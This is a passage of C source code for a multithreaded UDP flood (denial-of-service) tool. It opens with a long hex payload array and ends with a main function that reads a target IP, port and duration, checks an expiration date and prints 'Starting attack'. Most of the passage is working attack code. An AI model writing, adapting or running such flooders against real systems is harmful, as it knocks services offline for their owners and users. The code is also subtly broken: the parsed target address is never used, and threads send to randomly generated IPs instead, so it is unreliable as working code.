27\x72\x43\x5e\xe0\xbe\x90\x19\x89\x77\x5c\x09\x30\x1c\xef\x7e\xdb\x54\x42\x25\x42\x6a\xe9\xc0\x0a\x92\xae\x2a\xdf\xe0\xb2\xb6\x88\x4d\xd9\x93\x6d\xa6\xe6\x9e\x45\x1e\xc2\x39\x14\x48\xa8\xa7\x87\x6e\x68\xad\x2a\x79\x6d\x01\x71\xc6\x86\xe2\x81\x1d\xb4\x0c\xd0\x7d\x4c\x3b\x55\xc8\x5e\x9c\x09\x65\x5a\xd9\x99\x3b\xff\x4e\x94\xff\xbf\x70\x13\xab\x2c\x91\xc6\x78\x6f\xa7\xa5\x96\x5c\x8f\xcc\x24\x44\x1f\x44\xca\xcc\x57\xcf\x7c\xbf\xa5\x5f\xea\x2e\x08\xef\xfe\xc2\xb4\x64\xf8\xde\xa7\x53\xf9\x64\xc5\x9d\x73\x78\x8c\x24\x21\x9f\x6e\x43\x08\x0a\x61\x3f\x36\x29\xce\x6e\xfa\xe8\x29\x34\x4b\xe7\x94\x3a\x91\x63\x90\xcc\xe2\x37\xb7\x25\xc7\x53\x62\xf1\x23\xe8\x13\x03\x36\x62\xab\x67\x31\x6a\xe1\x33\x12\x03\x48\x76\xcd\xba\x66\xde\x14\xff\xd5\x1e\x93\x98\x42\xc7\xc3\xab\x13\xa0\xf4\xb9\x64\x10\x68\x65\x86\x38\x2b\x60\x49\x7e\xaf\x12\x15\xb9\xa4\x53\xb9\x04\x8a\x44\x9d\x8e\x5e\x82\x69\x22\x5d\xb5\xeb\x51\xda\x2d\x63\x86\x1f\xb8\x3e\xd7\x46\x02\x30\xb9\x4b\x97\xeb\x23\x3f\xab\x27\x0f\xfd\xc2\x9f\x6e\xe0\xd4\xa7\x3f\x1b\x23\xd2\xc4\x90\x6d\x5a\xf0\xcf\xd9\x13\x2b\xfa\xf8\xb1\x04\xd3\x69\x85\x06\x92\x44\x34\x49\x3a\xc7\xc0\xae\xc4\x13\x1d\xe3\x56\x63\x39\x83\x0e\xcb\x12\x11\x3a\x27\x06\xf6\x0a\xcf\x9a\xde\x26\xa5\xf3\xd7\x7b\xef\xac\x00\xf2\xaa\x85\xbb\xb3\x28\xbb\xe0\x7c\xd6\x00\x77\x05\x0f\xb3\x45\x9f\x1d\x42\x75\xfa\x4d\x58\x28\xb6\xf3\xb2\x5c\x5a\xba\x55\x17\x50\x1a\xd7\x7b\xdd\xe2\x13\x5a\xf7\x26\x3c\x3c\x29\xd1\xe5\xb2\xd0\xa3\xba\x6c\xd9\x68\xd1\x5e\xa9\xae\x6b\x54\x0f\x91\xb0\x74\xdd\x05\x33\x11\x4e\x86\x48\x8d\x1f\x93\x24\x00\x59\x39\x2e\xce\xa8\x6f\xc5\x87\xc6\x62\x33\xe2\x4f\xb0\x66\xb1\xe7\xaf\xe8\x6e\x8d\x72\x38\x6f\x7b\x68\xc9\x12\x67\xa6\x4c\x2e\x1f\x0c\x8b\xde\x36\x35\x4b\xc6\x29\x48\x06\x1c\x25\x5c\xf9\x02\x56\x5c\x3f\x2e\xfe\x59\x7b\x78\x2f\xed\xae\x54\xe0\xfd\x88\x1e\x87\xe0\x17\x70\x2b\x5c\xed\x29\x8a\xcd\x98\x06\xdb\x7f\x7a\xef\xbe\x67\x90\x5b\xe7\x5e\x7d\x4a\x44\xb0\x2e\x8f\x04\x79\xb2\xab\xcf\x1c\xdb\xaf\x7a\x7f\x35\xd4\xca\x92\xda\x8a\xf0\x8f\x9a\xee\x30\x97\xcd\x8f\xb8\x0e\x57\xdb\x3f\x2e\x3b\xe7\xac\x1a\xd9\x83\xc8\xe9\x7b\x5c\x5c\x62\xea\x0d\xf8\xa3\xa8\x63\xc3\x78\x72\xc4\x05\x9a\xab\x2a\x80\x44\x4a\x3f\x57\x54\xf4\x8d\xb0\x43\xb7\xe9\x3b\x91\x90\x78\x7b\x67\x87\x57\x4a\x36\x0b\x4b\x87\x42\x9d\x4f\xe1\x4a\x2c\x49\x6d\x44\xd8\x40\xec\xdf\xe0\xfc\xf9\x11\x63\xa4\xb6\x0e\x39\xe7\xda\x0e\xd2\xae\x20\x70\xe1\x58\x93\x65\xb8\x29\xbe\x01\x1b\x83\x02\x73\x2b\x01\x6c\x70\xfa\x4c\x20\x26\xae\x7e\x9e\x91\xb6\xc5\x93\x87\x00\x7c\x64\xbf\x80\x54\x4f\x76\x36\x05\xa1\xea\x01\x88\xab\xea\x69\x5e\x18\xa1\x19\x9a\x88\x1f\x2e\xdd\x31\x79\x5d\xef\xb9\xcf\x89\x96\xb1\x1c\x2f\x81\x3c\x5e\xef\x41\x8b\xea\x38\x85\xd7\x59\xbc\xd7\x81\xf2\x83\x11\x0c\xd4\x09\x3a\x21\x0e\x44\xc8\x3a\xd9\xb0\xc0\x87\x8b\x8d\x2c\x58\xfa\xbe\xdd\x62\x22\xe4\xe0\x66\xde\x5c\x79\xda\x22\x21\xc9\xc7\xdf\x85\x83\xa9\xeb\x5b\xb2\x5c\xad\x9e\x5f\x0e\x45\x06\x15\xf4\x5b\xf8\xc5\xbe\xb8\x97\x2f\xf1\xdd\x18\x1d\x13\x6a\x11\x28\xe1\x7d\x34\x6f\x38\x29\x53\xa6\xe9\x80\x44\xef\x6c\xf3\x33\x33\x65\xcc\x1a\x99\x25\x4b\xc5\xd4\x13\x92\x9b\x6a\x7e\xaf\xcc\x60\xeb\x88\xa4\x69\x1a\x8d\x02\x24\x22\xf0\xec\x6a\xf3\x78\xd4\xa4\x6e\xc8\x35\xe4\xb8\xb2\xd1\x24\x0c\x60\xcb\x81\x1f\x20\x8f\x08\xaa\x8a\x49\x5a\xe4\xed\xf2\x26\x92\x72\xf5\xc2\xac\xa8\x84\xad\x8a\xf6\x26\x94\xa2\x3b\x3c\x38\xb1\x5b\x83\x22\xcb\x5b\x2c\x83\xd7\x73\x31\xf8\x8c\xc0\x37\xa9\xa6\xc0\xf4\x67\x2d\x29\xba\xc4\x06\x6f\x8d\xce\xc7\xbf\xca\xb9\xaa\x1e\xfb\x07\x1e\xeb\x12\xb2\xf3\x9a\x11\x20\xfb\xf6\x4f\xad\x72\x10\xa3\xc2\x7e\x30\x83\xb5\xd4\x8b\xed\xcd\x6a\xb7\x43\x8a\xee\x19\xe0\x7e\x8e\xa5\xac\xeb\xfa\x9d\x43\x76\xb6\x68\xd2\x7b\x13\xc6\xb6\xf8\x2c\x75\x7b\x61\xca\xff\xc2\xca\x94\x51\x7a\xb5\xfd\xc9\x94\x24\xcf\x44\xa7\xbe\x14\xee\xfb\x6e\x3b\xf1\x51\xbc\x4f\x34\xec\x0c\xcf\x29";  // Adjust payload as needed

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    while (time(NULL) < end_time) {
        if (sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            break;  // Exit loop if send fails
        }
        usleep(1000);  // Sleep for 1ms to reduce CPU load
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("USAGE: ./cool <target_ip> <port> <duration>\n");
        exit(1);
    }

    // Check for expiration date
    check_expiration_date();

    char target_ip[16];
    strncpy(target_ip, argv[1], 15);
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Validate inputs
    if (port <= 0 || port > 65535 || duration <= 0) {
        printf("Invalid port or duration.\n");
        exit(1);
    }

    // Seed random number generator
    srand(time(NULL));

    // Thread pool
    int num_threads = 4;  // Fixed number of threads in the pool
    pthread_t threads[num_threads];
    thread_data_t thread_data[num_threads];

    printf("Starting attack on %s:%d for %d seconds...\n", target_ip, port, duration);

    for (int i = 0; i < num_threads; i++) {
        generate_random_ip(thread_data[i].ip);
        thread_data[i].port = port;
        thread_data[i].duration = duration;

        if (pthread_create(&threads[i], NULL, attack, &thread_data[i]) != 0) {
            perror("Failed to create thread");
            exit(1);
        }
    }

    // Wait for threads to complete
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}
